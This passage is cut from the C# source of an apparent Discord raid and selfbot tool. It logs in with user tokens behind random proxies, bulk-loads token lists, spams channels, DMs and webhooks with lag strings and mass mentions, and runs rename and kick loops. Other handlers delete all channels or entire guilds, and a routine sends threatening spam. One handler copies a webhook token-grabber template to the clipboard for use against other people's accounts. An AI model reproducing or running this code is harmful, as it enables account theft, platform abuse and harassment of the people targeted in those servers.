                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    public void refreshRoles()
    {
        try
        {
            listBox5.Items.Clear();
            foreach (SocketRole socketRole in getIndexedGuild(metroComboBox3.SelectedIndex).Roles)
            {
                listBox5.Items.Add(socketRole.Name);
            }
        }
        catch (Exception ex)
        {
        }
    }
    public SocketGuild getIndexedGuild(int index)
    {
        int i = 0;
        foreach (SocketGuild socketGuild in theSocketClient.Guilds)
        {
            if (i == index)
            {
                return socketGuild;
            }
            i++;
        }
        return null;
    }
    private void metroComboBox4_SelectedIndexChanged(object sender, EventArgs e)
    {
        try
        {
            metroComboBox5.Items.Clear();
            metroComboBox6.Items.Clear();
            System.Net.WebClient webClient = new System.Net.WebClient();
            SocketGuild socketGuild = getIndexedGuild(metroComboBox4.SelectedIndex);
            pictureBox9.BackgroundImage = System.Drawing.Image.FromStream(new System.IO.MemoryStream(webClient.DownloadData(getIndexedGuild(metroComboBox4.SelectedIndex).IconUrl)));
            foreach (SocketTextChannel socketTextChannel in socketGuild.TextChannels)
            {
                metroComboBox5.Items.Add(socketTextChannel.Name);
            }
            foreach (SocketVoiceChannel socketVoiceChannel in socketGuild.VoiceChannels)
            {
                metroComboBox6.Items.Add(socketVoiceChannel.Name);
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton102_Click(object sender, EventArgs e)
    {
        try
        {
            MessageBox.Show("You have got " + theSocketClient.Guilds.Count.ToString() + " guilds in your profile.", Text, MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton101_Click(object sender, EventArgs e)
    {
        try
        {
            SocketGuild socketGuild = getIndexedGuild(metroComboBox4.SelectedIndex);
            MessageBox.Show("This guild has got " + (socketGuild.VoiceChannels.Count + socketGuild.TextChannels.Count).ToString() + " total channels.", Text, MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton103_Click(object sender, EventArgs e)
    {
        try
        {
            MessageBox.Show("This guild has got " + getIndexedGuild(metroComboBox4.SelectedIndex).TextChannels.Count.ToString() + " text channels.", Text, MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton104_Click(object sender, EventArgs e)
    {
        try
        {
            MessageBox.Show("This guild has got " + getIndexedGuild(metroComboBox4.SelectedIndex).VoiceChannels.Count.ToString() + " voice channels.", Text, MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
        catch (Exception ex)
        {
        }
    }
    private async void metroButton105_Click(object sender, EventArgs e)
    {
        try
        {
            try
            {
                await getIndexedGuild(metroComboBox4.SelectedIndex).DownloadUsersAsync();
            }
            catch (Exception ex)
            {
            }
            await Task.Delay(1200);
            MessageBox.Show("This guild has got " + getIndexedGuild(metroComboBox4.SelectedIndex).Users.Count.ToString() + " total members.", Text, MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton106_Click(object sender, EventArgs e)
    {
        try
        {
            getIndexedGuild(metroComboBox4.SelectedIndex).LeaveAsync();
        }
        catch (Exception ex)
        {
        }
    }
    public SocketGuildUser getIndexedUser(SocketGuild guild, int index)
    {
        int i = 0;
        foreach (SocketGuildUser socketGuildUser in guild.Users)
        {
            if (i == index)
            {
                return socketGuildUser;
            }
            i++;
        }
        return null;
    }
    private void metroButton107_Click(object sender, EventArgs e)
    {
        try
        {
            if (saveFileDialog1.ShowDialog() == DialogResult.OK)
            {
                pictureBox9.BackgroundImage.Save(saveFileDialog1.FileName);
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton109_Click(object sender, EventArgs e)
    {
        try
        {
            getIndexedGuild(metroComboBox4.SelectedIndex).ModifyAsync(x =>
            {
                x.Icon = new Image(thePath1);
            });
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton108_Click(object sender, EventArgs e)
    {
        try
        {
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                thePath1 = openFileDialog1.FileName;
                pictureBox9.BackgroundImage = System.Drawing.Image.FromFile(openFileDialog1.FileName);
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton128_Click(object sender, EventArgs e)
    {
        try
        {
            metroButton128.Enabled = false;
            guildTypingSpammer = new Thread(new ThreadStart(doGuildTypingSpammer));
            guildTypingSpammer.Start();
            metroButton129.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton129_Click(object sender, EventArgs e)
    {
        try
        {
            metroButton129.Enabled = false;
            guildTypingSpammer.Abort();
            metroButton128.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    private async void metroButton127_Click(object sender, EventArgs e)
    {
        try
        {
            SocketGuild socketGuild = getIndexedGuild(metroComboBox4.SelectedIndex);
            if (metroRadioButton24.Checked)
            {
                int i = 0;
                foreach (SocketTextChannel socketTextChannel in socketGuild.TextChannels)
                {
                    if (i == metroComboBox4.SelectedIndex)
                    {
                        foreach (SocketGuildUser socketGuildUser in socketTextChannel.Users)
                        {
                            await socketGuildUser.SendMessageAsync(metroTextBox70.Text);
                            await Task.Delay((int)numericUpDown13.Value);
                        }
                        return;
                    }
                    i++;
                }
            }
            else if (metroRadioButton25.Checked)
            {
                int i = 0;
                foreach (SocketVoiceChannel socketVoiceChannel in socketGuild.VoiceChannels)
                {
                    if (i == metroComboBox5.SelectedIndex)
                    {
                        foreach (SocketGuildUser socketGuildUser in socketVoiceChannel.Users)
                        {
                            await socketGuildUser.SendMessageAsync(metroTextBox70.Text);
                            await Task.Delay((int)numericUpDown13.Value);
                        }
                        return;
                    }
                    i++;
                }
            }
            else if (metroRadioButton26.Checked)
            {
                foreach (SocketVoiceChannel socketVoiceChannel in socketGuild.VoiceChannels)
                {
                    try
                    {
                        foreach (SocketGuildUser socketGuildUser in socketVoiceChannel.Users)
                        {
                            try
                            {
                                await socketGuildUser.SendMessageAsync(metroTextBox70.Text);
                                await Task.Delay((int)numericUpDown13.Value);
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                    }
                }
            }
            else
            {
                foreach (SocketGuildUser socketGuildUser in socketGuild.Users)
                {
                    try
                    {
                        await socketGuildUser.SendMessageAsync(metroTextBox70.Text);
                        await Task.Delay((int)numericUpDown13.Value);
                    }
                    catch (Exception ex)
                    {
                    }
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    public void doGuildTypingSpammer()
    {
        try
        {
            while (true)
            {
                try
                {
                    SocketGuild socketGuild = getIndexedGuild(metroComboBox4.SelectedIndex);
                    if (metroRadioButton27.Checked)
                    {
                        try
                        {
                            int i = 0;
                            foreach (SocketTextChannel textChannel in socketGuild.TextChannels)
                            {
                                if (i == metroComboBox5.SelectedIndex)
                                {
                                    try
                                    {
                                        textChannel.TriggerTypingAsync();
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }
                                i++;
                            }
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                    else
                    {
                        try
                        {
                            foreach (SocketTextChannel textChannel in socketGuild.TextChannels)
                            {
                                try
                                {
                                    textChannel.TriggerTypingAsync();
                                }
                                catch (Exception ex)
                                {
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                }
                catch (Exception ex)
                {
                }
                Thread.Sleep(8000);
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton110_Click(object sender, EventArgs e)
    {
        try
        {
            int i = 0;
            foreach (SocketTextChannel socketTextChannel in getIndexedGuild(metroComboBox4.SelectedIndex).TextChannels)
            {
                if (i == metroComboBox5.SelectedIndex)
                {
                    socketTextChannel.ModifyAsync(x =>
                    {
                        x.Topic = metroTextBox69.Text;
                    });
                }
                i++;
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton111_Click(object sender, EventArgs e)
    {
        try
        {
            foreach (SocketTextChannel socketTextChannel in getIndexedGuild(metroComboBox4.SelectedIndex).TextChannels)
            {
                try
                {
                    socketTextChannel.SendMessageAsync(metroTextBox69.Text, metroCheckBox60.Checked);
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton112_Click(object sender, EventArgs e)
    {
        try
        {
            int i = 0;
            foreach (SocketTextChannel socketTextChannel in getIndexedGuild(metroComboBox4.SelectedIndex).TextChannels)
            {
                if (i == metroComboBox5.SelectedIndex)
                {
                    socketTextChannel.SendMessageAsync(metroTextBox69.Text, metroCheckBox60.Checked);
                }
                i++;
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton113_Click(object sender, EventArgs e)
    {
        try
        {
            int i = 0;
            foreach (SocketTextChannel socketTextChannel in getIndexedGuild(metroComboBox4.SelectedIndex).TextChannels)
            {
                if (i == metroComboBox5.SelectedIndex)
                {
                    socketTextChannel.ModifyAsync(x =>
                    {
                        x.Name = metroTextBox69.Text;
                    });
                }
                i++;
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton114_Click(object sender, EventArgs e)
    {
        try
        {
            int i = 0;
            foreach (SocketVoiceChannel socketVoiceChannel in getIndexedGuild(metroComboBox4.SelectedIndex).VoiceChannels)
            {
                if (i == metroComboBox6.SelectedIndex)
                {
                    socketVoiceChannel.ModifyAsync(x =>
                    {
                        x.Name = metroTextBox69.Text;
                    });
                }
                i++;
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton115_Click(object sender, EventArgs e)
    {
        try
        {
            foreach (SocketTextChannel socketTextChannel in getIndexedGuild(metroComboBox4.SelectedIndex).TextChannels)
            {
                try
                {
                    socketTextChannel.ModifyAsync(x =>
                    {
                        x.Name = metroTextBox69.Text;
                    });
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton116_Click(object sender, EventArgs e)
    {
        try
        {
            getIndexedGuild(metroComboBox4.SelectedIndex).CreateTextChannelAsync(metroTextBox69.Text);
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton117_Click(object sender, EventArgs e)
    {
        try
        {
            getIndexedGuild(metroComboBox4.SelectedIndex).CreateVoiceChannelAsync(metroTextBox69.Text);
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton118_Click(object sender, EventArgs e)
    {
        try
        {
            foreach (SocketVoiceChannel socketVoiceChannel in getIndexedGuild(metroComboBox4.SelectedIndex).VoiceChannels)
            {
                try
                {
                    socketVoiceChannel.ModifyAsync(x =>
                    {
                        x.Name = metroTextBox69.Text;
                    });
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton119_Click(object sender, EventArgs e)
    {
        try
        {
            foreach (SocketTextChannel socketTextChannel in getIndexedGuild(metroComboBox4.SelectedIndex).TextChannels)
            {
                try
                {
                    socketTextChannel.DeleteAsync();
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton126_Click(object sender, EventArgs e)
    {
        try
        {
            Discord.REQ.Channel.Create("4", metroTextBox69.Text, getIndexedGuild(metroComboBox4.SelectedIndex).Id.ToString(), metroTextBox1.Text);
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton120_Click(object sender, EventArgs e)
    {
        try
        {
            foreach (SocketVoiceChannel socketVoiceChannel in getIndexedGuild(metroComboBox4.SelectedIndex).VoiceChannels)
            {
                try
                {
                    socketVoiceChannel.DeleteAsync();
                }
                catch (Exception ex)
                {

                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton121_Click(object sender, EventArgs e)
    {
        try
        {
            SocketGuild socketGuild = getIndexedGuild(metroComboBox4.SelectedIndex);
            SocketVoiceChannel socketVoiceChannel = null;
            int i = 0;
            foreach (SocketVoiceChannel socketVoiceChannel1 in socketGuild.VoiceChannels)
            {
                if (i == metroComboBox6.SelectedIndex)
                {
                    socketVoiceChannel = socketVoiceChannel1;
                }
                i++;
            }
            foreach (SocketGuildUser socketGuildUser in getIndexedGuild(metroComboBox4.SelectedIndex).Users)
            {
                try
                {
                    socketGuildUser.ModifyAsync(x =>
                    {
                        x.Channel = socketVoiceChannel;
                    });
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton122_Click(object sender, EventArgs e)
    {
        try
        {
            foreach (SocketTextChannel socketTextChannel in getIndexedGuild(metroComboBox4.SelectedIndex).TextChannels)
            {
                try
                {
                    socketTextChannel.ModifyAsync(x =>
                    {
                        x.Topic = metroTextBox69.Text;
                    });
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton123_Click(object sender, EventArgs e)
    {
        try
        {
            getIndexedGuild(metroComboBox4.SelectedIndex).ModifyAsync(x =>
            {
                x.Name = metroTextBox69.Text;
            });
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton124_Click(object sender, EventArgs e)
    {
        try
        {
            getIndexedGuild(metroComboBox4.SelectedIndex).DeleteAsync();
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton125_Click(object sender, EventArgs e)
    {
        try
        {
            foreach (GuildChannel guildChannel in discordClient.GetGuild(getIndexedGuild(metroComboBox4.SelectedIndex).Id).GetChannels())
            {
                try
                {
                    guildChannel.Delete();
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton131_Click(object sender, EventArgs e)
    {
        try
        {
            metroButton131.Enabled = false;
            guildMessageSpammer = new Thread(new ThreadStart(doGuildMessageSpammer));
            guildMessageSpammer.Start();
            metroButton130.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton130_Click(object sender, EventArgs e)
    {
        try
        {
            metroButton130.Enabled = false;
            guildMessageSpammer.Abort();
            metroButton131.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    public void doGuildMessageSpammer()
    {
        try
        {
            while (true)
            {
                try
                {
                    SocketGuild socketGuild = getIndexedGuild(metroComboBox4.SelectedIndex);
                    SocketTextChannel socketTextChannel = null;
                    if (metroCheckBox63.Checked)
                    {
                        int i = 0;
                        foreach (SocketTextChannel textChannel in socketGuild.TextChannels)
                        {
                            if (i == metroComboBox5.SelectedIndex)
                            {
                                socketTextChannel = textChannel;
                            }
                            i++;
                        }
                    }
                    string theMessage = metroTextBox71.Text;
                    int theDelay = (int)numericUpDown14.Value;
                    if (metroRadioButton29.Checked)
                    {
                        theMessage = Utils.RandomNormalString(1750);
                    }
                    else if (metroRadioButton30.Checked)
                    {
                        theMessage = Utils.RandomChineseString(1750);
                    }
                    else if (metroRadioButton32.Checked)
                    {
                        theMessage = Utils.GetLagString();
                    }
                    if (metroCheckBox62.Checked)
                    {
                        theDelay = Utils.GetRandomNumber(750, 1250);
                    }
                    string allMentions = "";
                    if (metroCheckBox66.Checked)
                    {
                        allMentions = "@here";
                    }
                    if (metroCheckBox65.Checked)
                    {
                        allMentions = "@everyone " + allMentions;
                    }
                    if (metroCheckBox67.Checked)
                    {
                        string userMentions = "";
                        if (metroCheckBox63.Checked)
                        {
                            foreach (SocketGuildUser user in socketTextChannel.Users)
                            {
                                userMentions = user.Mention.ToString() + " " + userMentions;
                            }
                        }
                        else
                        {
                            foreach (SocketGuildUser user in socketGuild.Users)
                            {
                                userMentions = user.Mention.ToString() + " " + userMentions;
                            }
                        }
                        allMentions = userMentions + " " + allMentions;
                    }
                    theMessage = allMentions + " " + theMessage;
                    if (metroCheckBox69.Checked)
                    {
                        theMessage += " " + Utils.GetRandomNumber(1000, 9999);
                    }
                    Thread.Sleep(theDelay);
                    if (metroCheckBox63.Checked)
                    {
                        try
                        {
                            socketTextChannel.SendMessageAsync(theMessage);
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                    else
                    {
                        foreach (SocketTextChannel textChannel in socketGuild.TextChannels)
                        {
                            try
                            {
                                textChannel.SendMessageAsync(theMessage);
                                Thread.Sleep((int)numericUpDown15.Value);
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton75_Click(object sender, EventArgs e)
    {
        try
        {
            foreach (string line in metroTextBox56.Lines)
            {
                try
                {
                    Thread thread = new Thread(() => loadToken(line));
                    thread.Start();
                }
                catch (Exception ex)
                {
                }
            }
            MessageBox.Show("Succesfully loaded all tokens!", Text, MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
        catch (Exception ex)
        {
            MessageBox.Show("Failed to load all tokens!", Text, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }
    public void loadToken(string token)
    {
        try
        {
            if (!(token.Replace(" ", "").Replace(Constants.vbTab, "") == ""))
            {
                setRandomProxy();
                if (metroCheckBox123.Checked)
                {
                    if (Utils.IsTokenVerified(token))
                    {
                        loadedSelfBots.Add(new AClient(token));
                    }
                }
                else
                {
                    loadedSelfBots.Add(new AClient(token));
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton76_Click(object sender, EventArgs e)
    {
        try
        {
            if (openFileDialog2.ShowDialog() == DialogResult.OK)
            {
                metroTextBox56.Text = System.IO.File.ReadAllText(openFileDialog2.FileName);
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton77_Click(object sender, EventArgs e)
    {
        try
        {
            loadedSelfBots.Clear();
            MessageBox.Show("Succesfully unloaded all tokens!", Text, MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
        catch (Exception ex)
        {
            MessageBox.Show("Failed to unload all tokens!", Text, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }
    private void metroButton133_Click(object sender, EventArgs e)
    {
        try
        {
            Utils.DeleteWebHook(metroTextBox77.Text);
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton135_Click(object sender, EventArgs e)
    {
        try
        {
            metroButton135.Enabled = false;
            webhookSpammer = new Thread(new ThreadStart(doWebhookSpammer));
            webhookSpammer.Start();
            metroButton134.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton134_Click(object sender, EventArgs e)
    {
        try
        {
            metroButton134.Enabled = false;
            webhookSpammer.Abort();
            metroButton135.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    private void metroRadioButton35_CheckedChanged(object sender, EventArgs e)
    {
        metroTextBox79.Enabled = metroRadioButton35.Checked;
    }
    private void metroCheckBox75_Click(object sender, EventArgs e)
    {
        metroCheckBox76.Checked = false;
        metroCheckBox77.Checked = false;
        metroCheckBox78.Checked = false;
        metroTextBox80.Enabled = false;
    }
    private void metroCheckBox76_Click(object sender, EventArgs e)
    {
        metroCheckBox75.Checked = false;
        metroCheckBox77.Checked = false;
        metroCheckBox78.Checked = false;
        metroTextBox80.Enabled = false;
    }
    private void metroCheckBox77_Click(object sender, EventArgs e)
    {
        metroCheckBox75.Checked = false;
        metroCheckBox76.Checked = false;
        metroCheckBox78.Checked = false;
        metroTextBox80.Enabled = true;
    }
    private void metroCheckBox78_Click(object sender, EventArgs e)
    {
        metroCheckBox75.Checked = false;
        metroCheckBox76.Checked = false;
        metroCheckBox77.Checked = false;
        metroTextBox80.Enabled = false;
    }
    private void metroButton136_Click(object sender, EventArgs e)
    {
        try
        {
            Clipboard.SetText(Resources.webhook_token_grabber.Replace("%WEBHOOK_LINK%", metroTextBox81.Text).Replace("%TITLE%", metroTextBox82.Text).Replace("%MESSAGE%", metroTextBox83.Text).Replace("%CONSOLE%", metroTextBox84.Text));
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton137_Click(object sender, EventArgs e)
    {
        try
        {
            Discord.REQ.UserProfile.SetStatus(metroTextBox85.Text, metroTextBox86.Text, discordClient.Token);
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton139_Click(object sender, EventArgs e)
    {
        metroButton139.Enabled = false;
        metroButton138.Enabled = true;
    }
    private void metroButton138_Click(object sender, EventArgs e)
    {
        metroButton138.Enabled = false;
        metroButton139.Enabled = true;
    }
    private void metroButton140_Click(object sender, EventArgs e)
    {
        try
        {
            Thread thread = new Thread(new ThreadStart(banToken));
            thread.Start();
        }
        catch (Exception ex)
        {
        }
    }
    public void banToken()
    {
        try
        {
            discordClient.JoinGuild("otaku");
            Thread.Sleep(3200);
            SocketGuild socketGuild = theSocketClient.GetGuild(290843998296342529);
            int i = 0;
            foreach (SocketGuildUser socketGuildUser in socketGuild.Users)
            {
                try
                {
                    if (i >= 20)
                    {
                        return;
                    }
                    else
                    {
                        string omegalul = Utils.GetLagString();
                        omegalul = omegalul.Substring(0, omegalul.Length - 600);
                        var embed = new EmbedBuilder();
                        embed.WithColor(new Color(204, 0, 0));
                        embed.WithTitle("JOIN IN THIS SERVER OR I WILL HACK YOUR DISCORD NOW XD XD XD 1111 I'M THE BEST HACKER ANONYMOUS");
                        embed.WithDescription(omegalul);
                        socketGuildUser.SendMessageAsync("Hey! Vuoi entrare in AnimeItalia che è il miglior server di sempre degli anime meglio anche di quella merda di Anime Souls? ALLORA ENTRA SUBITO COGLIONE DI MERDA! DO YOU WANT TO JOIN IN THE BEST OTAKU COMMUNITY? JOIN NOW! ENTER HERE: https://discord.gg/AJhzmaW", false, embed.Build());
                        i++;
                    }
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton141_Click(object sender, EventArgs e)
    {
        try
        {
            if (Utils.CheckWebhook(metroTextBox87.Text))
            {
                MessageBox.Show("This webhook is valid!", Text, MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else
            {
                MessageBox.Show("This webhook is not valid!", Text, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show("This webhook is not valid!", Text, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }
    private void metroButton143_Click(object sender, EventArgs e)
    {
        try
        {
            Clipboard.SetText(Resources.token_login.Replace("%TOKEN_HERE%", discordClient.Token));
        }
        catch (Exception ex)
        {
        }
    }
    private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
    {
        refreshUsersGroup();
    }
    private void metroRadioButton5_CheckedChanged(object sender, EventArgs e)
    {
        metroTextBox12.Enabled = !metroRadioButton5.Checked;
    }
    private void metroCheckBox1_Click(object sender, EventArgs e)
    {
        metroCheckBox2.Checked = false;
        numericUpDown4.Enabled = true;
    }
    private void metroCheckBox2_Click(object sender, EventArgs e)
    {
        metroCheckBox1.Checked = false;
        numericUpDown4.Enabled = false;
    }
    private void metroButton24_Click(object sender, EventArgs e)
    {
        try
        {
            getIndexedGroup(listBox1.SelectedIndex).SendMessageAsync(metroTextBox9.Text);
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton25_Click(object sender, EventArgs e)
    {
        try
        {
            getIndexedGroup(listBox1.SelectedIndex).LeaveAsync();
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton26_Click(object sender, EventArgs e)
    {
        try
        {
            Discord.REQ.Group.Rename(getIndexedGroup(listBox1.SelectedIndex).Id.ToString(), metroTextBox10.Text, discordClient.Token);
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton28_Click(object sender, EventArgs e)
    {
        try
        {
            metroButton28.Enabled = false;
            renameLooper = new Thread(new ThreadStart(doRenameLooper));
            renameLooper.Start();
            metroButton27.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton27_Click(object sender, EventArgs e)
    {
        try
        {
            metroButton27.Enabled = false;
            renameLooper.Abort();
            metroButton28.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    public void doRenameLooper()
    {
        try
        {
            while (true)
            {
                try
                {
                    Discord.REQ.Group.Rename(getIndexedGroup(listBox1.SelectedIndex).Id.ToString(), Utils.RandomNormalString(99), discordClient.Token);
                    Thread.Sleep((int)numericUpDown2.Value);
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton29_Click(object sender, EventArgs e)
    {
        try
        {
            Discord.REQ.Group.CloseDMChannel(getIndexedGroup(listBox1.SelectedIndex).Id.ToString(), discordClient.Token);
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton30_Click(object sender, EventArgs e)
    {
        try
        {
            SocketGroupChannel groupChannel = getIndexedGroup(listBox1.SelectedIndex);
            foreach (SocketUser socketUser in groupChannel.Users)
            {
                try
                {
                    Discord.REQ.Group.KickUser(groupChannel.Id.ToString(), socketUser.Id.ToString(), discordClient.Token);
                }
                catch (Exception ex)
                {
                }
            }
            try
            {
                groupChannel.LeaveAsync();
            }
            catch (Exception ex)
            {
            }
            try
            {
                Discord.REQ.Group.CloseDMChannel(groupChannel.Id.ToString(), discordClient.Token);
            }
            catch (Exception ex)
            {
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton31_Click(object sender, EventArgs e)
    {
        try
        {
            Discord.REQ.Group.AddUser(getIndexedGroup(listBox1.SelectedIndex).Id.ToString(), metroTextBox11.Text, discordClient.Token);
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton32_Click(object sender, EventArgs e)
    {
        try
        {
            foreach (SocketGroupChannel socketGroupChannel in theSocketClient.GroupChannels)
            {
                try
                {
                    socketGroupChannel.LeaveAsync();
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton33_Click(object sender, EventArgs e)
    {
        try
        {
            SocketGroupChannel socketGroupChannel = getIndexedGroup(listBox1.SelectedIndex);
            Discord.REQ.Group.KickUser(socketGroupChannel.Id.ToString(), getIndexedGroupUser(socketGroupChannel, listBox2.SelectedIndex).Id.ToString(), discordClient.Token);
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton34_Click(object sender, EventArgs e)
    {
        try
        {
            SocketGroupChannel socketGroupChannel = getIndexedGroup(listBox1.SelectedIndex);
            foreach (SocketUser socketUser in socketGroupChannel.Users)
            {
                try
                {
                    Discord.REQ.Group.KickUser(socketGroupChannel.Id.ToString(), socketUser.Id.ToString(), discordClient.Token);
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton36_Click(object sender, EventArgs e)
    {
        try
        {
            metroButton36.Enabled = false;
            addKickLooper = new Thread(new ThreadStart(doAddKickLooper));
            addKickLooper.Start();
            metroButton35.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton35_Click(object sender, EventArgs e)
    {
        try
        {
            metroButton35.Enabled = false;
            addKickLooper.Abort();
            metroButton36.Enabled = true;
            addKickStatus = 0;
        }
        catch (Exception ex)
        {
        }
    }
    public void doAddKickLooper()
    {
        try
        {
            while (true)
            {
                try
                {
                    SocketGroupChannel socketGroupChannel = getIndexedGroup(listBox1.SelectedIndex);
                    string userId = "";
                    if (metroRadioButton5.Checked)
                    {
                        userId = getIndexedGroupUser(socketGroupChannel, listBox2.SelectedIndex).Id.ToString();
                    }
                    else
                    {
                        userId = metroTextBox12.Text;
                    }
                    if (addKickStatus == 0)
                    {
                        addKickStatus = 1;
                        Discord.REQ.Group.KickUser(socketGroupChannel.Id.ToString(), userId, discordClient.Token);
                    }
                    else
                    {
                        addKickStatus = 0;
                        Discord.REQ.Group.AddUser(socketGroupChannel.Id.ToString(), userId, discordClient.Token);
                    }
                    Thread.Sleep((int)numericUpDown3.Value);
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton38_Click(object sender, EventArgs e)
    {
        try
        {
            metroButton38.Enabled = false;
            groupSpammer = new Thread(new ThreadStart(doGroupSpammer));
            groupSpammer.Start();
            metroButton37.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton144_Click(object sender, EventArgs e)
    {
        try
        {
            Discord.REQ.Group.CloseDMChannel(Utils.GetChannelIDByFriendID(discordClient.Token, metroTextBox14.Text), discordClient.Token);
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton145_Click(object sender, EventArgs e)
    {
        try
        {
            friendMassMessage = new Thread(new ThreadStart(doMassMessage));
            friendMassMessage.Start();
        }
        catch (Exception ex)
        {
        }
    }
    private void metroCheckBox84_Click(object sender, EventArgs e)
    {
        metroCheckBox85.Checked = false;
        numericUpDown19.Enabled = true;
    }
    private void metroCheckBox85_Click(object sender, EventArgs e)
    {
        metroCheckBox84.Checked = false;
        numericUpDown19.Enabled = false;
    }
    private void metroButton146_Click(object sender, EventArgs e)
    {
        try
        {
            Discord.REQ.RelationShip.MuteUser(Utils.GetChannelIDByFriendID(discordClient.Token, metroTextBox14.Text), discordClient.Token);
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton147_Click(object sender, EventArgs e)
    {
        try
        {
            Discord.REQ.RelationShip.UnMuteUser(Utils.GetChannelIDByFriendID(discordClient.Token, metroTextBox14.Text), discordClient.Token);
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton149_Click(object sender, EventArgs e)
    {
        metroButton149.Enabled = false;
        metroButton148.Enabled = true;
    }
    private void metroButton148_Click(object sender, EventArgs e)
    {
        metroButton148.Enabled = false;
        metroButton149.Enabled = true;
    }
    private async void metroButton1_Click_1(object sender, EventArgs e)
    {
        try
        {
            setRandomProxy();
            if (metroRadioButton1.Checked)
            {
                await theSocketClient.LoginAsync(TokenType.User, metroTextBox1.Text);
                discordClient = new DiscordClient(metroTextBox1.Text);
            }
            else
            {
                await theSocketClient.LoginAsync(TokenType.Bot, metroTextBox1.Text);
            }
            isBot = metroRadioButton2.Checked;
            await theSocketClient.StartAsync();
            MessageBox.Show("Succesfully connected to Discord!", Text, MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
        catch (Exception ex)
        {
            MessageBox.Show("The token is not valid! Can't connect to Discord!", Text, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }
    private void metroButton150_Click(object sender, EventArgs e)
